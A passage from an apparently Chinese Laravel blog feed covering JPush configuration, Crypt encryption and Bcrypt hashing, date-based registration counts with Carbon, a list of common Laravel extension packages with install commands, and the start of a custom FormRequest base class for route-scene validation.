class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'providers'</span> =&gt; [</span><br><span class="line">  App\Providers\JpushServiceProvider::class,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>创建配置文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'key'</span> =&gt; env(<span class="string">'JPUSH_KEY'</span>),</span><br><span class="line">    <span class="string">'secret'</span> =&gt; env(<span class="string">'JPUSH_SECRET'</span>),</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>在 env 文件中填写 Jpush 的 key 和 secret：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># jpush</span><br><span class="line">JPUSH_KEY&#x3D;9c6f53edad67db7ec24bfe32</span><br><span class="line">JPUSH_SECRET&#x3D;deeb2a04669ab79******</span><br></pre></td></tr></table></figure><p>这样我们可以直接依赖注入 <code>JPush\Client</code> 或者 <code>app(&#39;jpush&#39;)</code> 来使用 Jpush 的 SDK。</p><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><p>在Laravel 中，流行两种加密方式，一种是 OpenSSL 所提供的 AES-256 和 AES-128 加密，另外一种是 Bcrypt 和 Argon2 的哈希加密方式。</p><h3 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h3><p>使用 <code>Crypt</code> 门面提供的 <code>encryptString</code> 来加密一个值，或者使用 <code>encrypt</code> 助手函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt(<span class="number">122410</span>);</span><br><span class="line">eyJpdiI6IlJhd3h6amtXTFh5cit2bU9ySldNU2c9PSIsInZhbHVlIjoiZlRTdWx6Wk5oTVhjSnZyR0pMdkJ0dz09IiwibWFjIjoiYWVmMTE2NWUyZjkwMWZmNWI0N2I5Y2EwNzgxMjU5ZGI4NDE0OTU2MzJhY2I1ZWFkNzJmOWMyNjMwNzIxMTBjMiJ9</span><br></pre></td></tr></table></figure><p>使用 <code>Crypt</code> 门面提供的 <code>decryptString</code> 来进行解密，或者使用<code>decrypt</code> 助手函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">decrypt(<span class="string">"eyJpdiI6IlJhd3h6amtXTFh5cit2bU9ySldNU2c9PSIsInZhbHVlIjoiZlRTdWx6Wk5oTVhjSnZyR0pMdkJ0dz09IiwibWFjIjoiYWVmMTE2NWUyZjkwMWZmNWI0N2I5Y2EwNzgxMjU5ZGI4NDE0OTU2MzJhY2I1ZWFkNzJmOWMyNjMwNzIxMTBjMiJ9"</span>)</span><br><span class="line"><span class="number">122410</span></span><br></pre></td></tr></table></figure><h3 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h3><p>Bcrypt 是哈希密码的理想选择，因为它的「加密系数」可以任意调整，这意味着生成哈希所需的时间可以随着硬件功率的增加而增加。</p><p>使用 <code>Hash</code> 门面提供的 <code>make</code> 方法来进行加密，或者使用<code>bcrypt</code> 助手函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hash::make(<span class="number">122410</span>);</span><br><span class="line">$<span class="number">2</span>y$<span class="number">10</span>$DsKye7lBalaUkvBOEk6cvOrLGvgPD2EKkV/QtWuChbJ8It5JiVoM2</span><br></pre></td></tr></table></figure><p>哈希加密无法解密，只能通过验证的方式来判断加密前后密码是否一致。</p><p>使用<code>Hash</code> 门面提供的<code>check</code> 方法进行哈希验证，或者使用<code>password_verify</code> 助手函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hash::check(<span class="number">122410</span>, <span class="string">'$2y$10$DsKye7lBalaUkvBOEk6cvOrLGvgPD2EKkV/QtWuChbJ8It5JiVoM2'</span>);</span><br><span class="line"><span class="keyword">true</span></span><br></pre></td></tr></table></figure><h2 id="统计"><a href="#统计" class="headerlink" title="统计"></a>统计</h2><p>开发中，我们常会遇到这样的需求：</p><ul><li>统计今天的注册量</li><li>统计昨天的注册量</li><li>统计每个月第一天的注册量</li><li>统计这个月的注册量</li></ul><p>多数时候，我们会这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UserModel::whereBetween(<span class="string">"created_at"</span>, [$startTime, $endTime])-&gt;count();</span><br></pre></td></tr></table></figure><p>其实使用Carbon 配合Laravel 查询构造器可以很好地解决这类问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 统计今天的注册量</span></span><br><span class="line">UserModel::whereDate(<span class="string">'created_at'</span>, today())-&gt;count();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应SQL</span></span><br><span class="line">select count(*) <span class="keyword">as</span> aggregate from `user` where date(`created_at`) = <span class="string">'2021-08-12'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 统计昨天的注册量</span></span><br><span class="line">UserModel::whereDate(<span class="string">'created_at'</span>, Carbon::yesterday())-&gt;count();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应SQL</span></span><br><span class="line">select count(*) <span class="keyword">as</span> aggregate from `user` where date(`created_at`) = <span class="string">'2021-08-11'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 统计每个月第一天的注册量</span></span><br><span class="line">UserModel::whereDay(<span class="string">'created_at'</span>, <span class="string">"01"</span>)-&gt;count()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应SQL</span></span><br><span class="line">select count(*) <span class="keyword">as</span> aggregate from `user` where day(`created_at`) = <span class="string">'01'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 统计这个月的注册量</span></span><br><span class="line">UserModel::whereMonth(<span class="string">'created_at'</span>, now()-&gt;format(<span class="string">"m"</span>))-&gt;count()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应SQL</span></span><br><span class="line">select count(*) <span class="keyword">as</span> aggregate from `user` where month(`created_at`) = <span class="string">'08'</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel 常用扩展包整理</title>
      <link href="/laravel-commonly-used-extension-package-finishing/"/>
      <url>/laravel-commonly-used-extension-package-finishing/</url>
      
        <content type="html"><![CDATA[<p>Laravel 开发如此高效，除了其框架本身易用之外，同时也离不开各种丰富的扩展包的支持。</p><a id="more"></a><h2 id="辅助类"><a href="#辅助类" class="headerlink" title="辅助类"></a>辅助类</h2><h3 id="laravel-cors"><a href="#laravel-cors" class="headerlink" title="laravel-cors"></a>laravel-cors</h3><p>所有问题，跨域先行。跨域问题没有解决，一切处理都是纸老虎。</p><p><a href="https://github.com/fruitcake/laravel-cors" target="_blank" rel="noopener">laravel-cors</a> 是一个解决跨域问题的扩展包，不知道是从哪个版本起，已经默认引入框架了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require fruitcake/laravel-cors</span><br></pre></td></tr></table></figure><h3 id="Laravel-lang"><a href="#Laravel-lang" class="headerlink" title="Laravel-lang"></a>Laravel-lang</h3><p><a href="https://github.com/overtrue/laravel-lang" target="_blank" rel="noopener">Laravel-lang</a> 是一个非常易用的语言包，现已支持多达75 种语言。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require <span class="string">"overtrue/laravel-lang:~5.0"</span></span><br></pre></td></tr></table></figure><p>编辑配置文件：<code>config/app.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'locale'</span> =&gt; <span class="string">'zh_CN'</span>,</span><br></pre></td></tr></table></figure><h3 id="Captcha-for-Laravel"><a href="#Captcha-for-Laravel" class="headerlink" title="Captcha for Laravel"></a>Captcha for Laravel</h3><p><a href="https://github.com/mewebstudio/captcha" target="_blank" rel="noopener">captcha</a> 是一个生成验证码的扩展包。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require mews/captcha</span><br></pre></td></tr></table></figure><h3 id="Carbon"><a href="#Carbon" class="headerlink" title="Carbon"></a>Carbon</h3><p><a href="http://carbon.nesbot.com/" target="_blank" rel="noopener">Carbon</a> 可以帮助我们在 PHP 开发中处理日期 / 时间变得更加简单、更具语义化。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require nesbot/carbon</span><br></pre></td></tr></table></figure><p>记得设置时区 <code>config/app.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'timezone'</span> =&gt; <span class="string">'PRC'</span>,</span><br></pre></td></tr></table></figure><h3 id="Eloquent-Model-Generator"><a href="#Eloquent-Model-Generator" class="headerlink" title="Eloquent Model Generator"></a>Eloquent Model Generator</h3><p><a href="https://github.com/krlove/eloquent-model-generator" target="_blank" rel="noopener">Eloquent Model Generator</a> 是一个基于代码生成器的 Eloquent Model 生成工具。</p><p>只在开发环境中安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require --dev krlove/eloquent-model-generator</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan krlove:generate:model UserModel --table-name=user --output-path=./Models --namespace=App\\Models</span><br></pre></td></tr></table></figure><h3 id="IDE-Helper"><a href="#IDE-Helper" class="headerlink" title="IDE Helper"></a>IDE Helper</h3><p><a href="https://github.com/barryvdh/laravel-ide-helper#laravel-ide-helper-generator" target="_blank" rel="noopener">Laravel IDE Helper</a> 是一个代码提示及补全工具。</p><p>只在开发环境中安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require --dev barryvdh/laravel-ide-helper</span><br></pre></td></tr></table></figure><p>对于只在开发环境中需要安装的扩展包，在 app/Providers/AppServiceProvider.php 文件中以如下方式进行注册：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;app-&gt;environment() !== <span class="string">'production'</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;register(\Barryvdh\LaravelIdeHelper\IdeHelperServiceProvider::class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基础用法：</p><ul><li><code>php artisan ide-helper:generate</code>：为 Facades 生成注释</li><li><code>php artisan ide-helper:models</code>：</li><li><code>php artisan ide-helper:meta</code>：生成 PhpStorm Meta file</li></ul><h4 id="为-Facades-生成注释"><a href="#为-Facades-生成注释" class="headerlink" title="为 Facades 生成注释"></a>为 Facades 生成注释</h4><p>运行一下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:generate</span><br></pre></td></tr></table></figure><p>执行完成之后会在项目根目录下生成一个 <code>_ide_helper.php</code> 文件。</p><h4 id="为模型生成注解"><a href="#为模型生成注解" class="headerlink" title="为模型生成注解"></a>为模型生成注解</h4><p>使用Laravel 为我们提供的 <code>make:model</code> 默认不会为在模型文件中，生成相应的注解。</p><p>当我们需要通过对象获取模型的某个属性时，IDE 这时会提示未定义的属性，虽然不会影响功能的使用，但是对于开发人员来说并不友好。</p><p>看起来就像这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210605110602.png" alt=""></p><p>使用<code>IDE Helper</code> 来生成模型注解：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:models <span class="string">"App\Models\UserModel"</span></span><br><span class="line"></span><br><span class="line">Do you want to overwrite the existing model files? Choose no to write to _ide_helper_models.php instead? (Yes/No):  (yes/no) [no]:</span><br></pre></td></tr></table></figure><p>建议选择『yes』，否则会生成「_ide_helper_models.php」文件，这样在跟踪文件的时候不会跳转到「_ide_helper_models.php」文件。</p><p>如果希望为所有模型都加上注解，则省略后面的参数。</p><p>看起来好多了：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210605111205.png" alt=""></p><blockquote><p>注意： 为模型生成字段信息必须在数据库中存在相应的数据表。</p></blockquote><h4 id="自动为链式操作注释"><a href="#自动为链式操作注释" class="headerlink" title="自动为链式操作注释"></a>自动为链式操作注释</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:meta</span><br></pre></td></tr></table></figure><p>执行完成之后会在项目根目录下生成一个 <code>.phpStorm.meta.php</code> 文件。</p><h3 id="Laravel-Query-Logger"><a href="#Laravel-Query-Logger" class="headerlink" title="Laravel Query Logger"></a>Laravel Query Logger</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require overtrue/laravel-query-logger --dev</span><br></pre></td></tr></table></figure><p>启用日志记录 <code>config/logging.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加入以下配置，开启日志查询记录</span></span><br><span class="line"><span class="string">'query'</span> =&gt; [</span><br><span class="line">    <span class="string">'enabled'</span> =&gt; env(<span class="string">'LOG_QUERY'</span>, env(<span class="string">'APP_ENV'</span>) === <span class="string">'local'</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only record queries that are slower than the following time</span></span><br><span class="line">    <span class="comment">// Unit: milliseconds</span></span><br><span class="line">    <span class="string">'slower_than'</span> =&gt; <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only record queries when the QUERY_LOG_TRIGGER is set in the environment,</span></span><br><span class="line">    <span class="comment">// or when the trigger HEADER, GET, POST, or COOKIE variable is set.</span></span><br><span class="line">    <span class="string">'trigger'</span> =&gt; env(<span class="string">'QUERY_LOG_TRIGGER'</span>),</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f ./storage/logs/laravel.log</span><br></pre></td></tr></table></figure><h3 id="Logging-for-PHP"><a href="#Logging-for-PHP" class="headerlink" title="Logging for PHP"></a>Logging for PHP</h3><p><a href="https://github.com/Seldaek/monolog" target="_blank" rel="noopener">Logging for PHP</a> 是一个可以将日志保存至各种位置的扩展包。</p><p>通常在测试回调时，会用得比较多。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require monolog/monolog</span><br></pre></td></tr></table></figure><p>基础用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Monolog</span>\<span class="title">Logger</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Monolog</span>\<span class="title">Handler</span>\<span class="title">StreamHandler</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a log channel</span></span><br><span class="line">$log = <span class="keyword">new</span> Logger(<span class="string">'name'</span>);</span><br><span class="line">$log-&gt;pushHandler(<span class="keyword">new</span> StreamHandler(<span class="string">'path/to/your.log'</span>, Logger::WARNING));</span><br><span class="line"></span><br><span class="line"><span class="comment">// add records to the log</span></span><br><span class="line">$log-&gt;warning(<span class="string">'Foo'</span>);</span><br><span class="line">$log-&gt;error(<span class="string">'Bar'</span>);</span><br></pre></td></tr></table></figure><h3 id="Laravel-Debugbar"><a href="#Laravel-Debugbar" class="headerlink" title="Laravel Debugbar"></a>Laravel Debugbar</h3><p>Laravel Debugbar 是一个很棒的扩展包。在很多应用程序方面，你可以使用它来收集数据。比如查询，视图，时间等等；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="keyword">require</span> barryvdh/laravel-debugbar --dev</span><br></pre></td></tr></table></figure><h3 id="Laravel-Telescope"><a href="#Laravel-Telescope" class="headerlink" title="Laravel Telescope"></a>Laravel Telescope</h3><p>Laravel Telescope 是一个非常酷的工具，对 Laravel 应用，有“优雅的调试助手”的美称。</p><p>你可以用它来监控很多东西：</p><ul><li>请求</li><li>命令</li><li>异常</li><li>日志</li><li>查询</li><li>事件</li><li>…</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="keyword">require</span> laravel/telescope --dev</span><br></pre></td></tr></table></figure><h3 id="Faker"><a href="#Faker" class="headerlink" title="Faker"></a>Faker</h3><p><a href="https://github.com/fzaninotto/Faker" target="_blank" rel="noopener">fzaninotto/Faker</a> 是一个生成假数据的 PHP 库，支持非常多的语言。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require fzaninotto/faker</span><br></pre></td></tr></table></figure><p><a href="https://github.com/imvkmark/poppy-faker" target="_blank" rel="noopener">Poppy Faker</a> 是基于 <a href="https://github.com/fzaninotto/Faker" target="_blank" rel="noopener">fzaninotto/Faker</a> 的中文轻量级 Fake 数据生成类。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require poppy/faker</span><br></pre></td></tr></table></figure><h2 id="开发类"><a href="#开发类" class="headerlink" title="开发类"></a>开发类</h2><h3 id="jwt-auth"><a href="#jwt-auth" class="headerlink" title="jwt-auth"></a>jwt-auth</h3><p><a href="https://github.com/tymondesigns/jwt-auth" target="_blank" rel="noopener">jwt-auth</a> 是 Laravel 和 lumen 下一个优秀 JWT 组件。</p><p>具体使用介绍可以查看我的——<a href="https://www.0x2beace.com/laravel-jwt-auth-use-detailed-explanation/">Laravel jwt-auth 使用详解</a> 。</p><h3 id="laravel-enum"><a href="#laravel-enum" class="headerlink" title="laravel-enum"></a>laravel-enum</h3><p><a href="https://github.com/BenSampo/laravel-enum" target="_blank" rel="noopener">laravel-enum</a> 是一个简单易用，扩展性高的处理枚举的扩展包。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require bensampo/laravel-enum</span><br></pre></td></tr></table></figure><h3 id="Intervention-image"><a href="#Intervention-image" class="headerlink" title="Intervention/image"></a>Intervention/image</h3><p><a href="https://github.com/Intervention/image" target="_blank" rel="noopener">Intervention/image</a> 是一个处理图片裁切的扩展包，对应的API 文档在<a href="http://image.intervention.io/api/crop" target="_blank" rel="noopener">这里</a>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require intervention/image</span><br></pre></td></tr></table></figure><h3 id="laravel-wechat"><a href="#laravel-wechat" class="headerlink" title="laravel-wechat"></a>laravel-wechat</h3><p><a href="https://github.com/overtrue/laravel-wechat" target="_blank" rel="noopener">微信 SDK for Laravel</a>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require <span class="string">"overtrue/laravel-wechat"</span></span><br></pre></td></tr></table></figure><h3 id="easy-sms"><a href="#easy-sms" class="headerlink" title="easy-sms"></a>easy-sms</h3><p><a href="https://github.com/overtrue/easy-sms" target="_blank" rel="noopener">easy-sms</a> 一款满足你的多种发送需求的短信发送组件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require <span class="string">"overtrue/easy-sms"</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Request 类实现路由场景验证</title>
      <link href="/laravel-request-class-implements-routing-scenario-verification/"/>
      <url>/laravel-request-class-implements-routing-scenario-verification/</url>
      
        <content type="html"><![CDATA[<p>在Laravel 中，有很多方法可以验证传入的数据，对于表单请求，通常主要有两种方式：</p><ol><li>在控制器中使用<code>ValidatesRequests</code> 的 <code>validate()</code>方法</li><li>创建表单验证类</li></ol><a id="more"></a><p>对于第一种方式，只适用一些功能单一、验证规则比较简单的验证场景。</p><p>对于复杂一些的验证场景，使用表单验证，会更方便一些。</p><p>经常使用表单验证的同学可能会知道，Request 类也不会万能的，对于一些重复使用的验证规则，默认的Request 类，并没有提供好的验证规则复用方法。</p><p>所以有没有某种方案，最终可以解决以下需求：</p><ol><li><code>rules()</code> 方法只需要返回一个该请求的验证规则数组</li><li>基于路由场景验证，不同的验证场景可以使用相同的验证规则</li><li>对于字段相同，但是验证规则不同的情况，可以重置验证规则</li></ol><p>感谢 <a href="https://learnku.com/blog/sirping" target="_blank" rel="noopener">sirping</a> 的 <a href="https://learnku.com/articles/38825#863a85" target="_blank" rel="noopener">Laravel 验证类 实现 路由场景验证 和 控制器场景验证</a>，提供了一个基于路由的场景验证的简单易用方案。</p><h2 id="重写FormRequest-类"><a href="#重写FormRequest-类" class="headerlink" title="重写FormRequest 类"></a>重写FormRequest 类</h2><p>因为每一个Request 类，后面都会使用到场景验证，所以这里直接创建一个基类继承于 <code>FormRequest</code>类，并重写相关方法：</p><p><code>app/Http/Requests/BaseRequest.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Requests</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Traits</span>\<span class="title">ApiResponse</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Validation</span>\<span class="title">Factory</span> <span class="title">as</span> <span class="title">ValidationFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Validation</span>\<span class="title">Validator</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Http</span>\<span class="title">FormRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Exceptions</span>\<span class="title">HttpResponseException</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class BaseRequest</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Http\Requests</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseRequest</span> <span class="keyword">extends</span> <span class="title">FormRequest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ApiResponse</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> null</span></span><br><span class="line"><span class="comment">     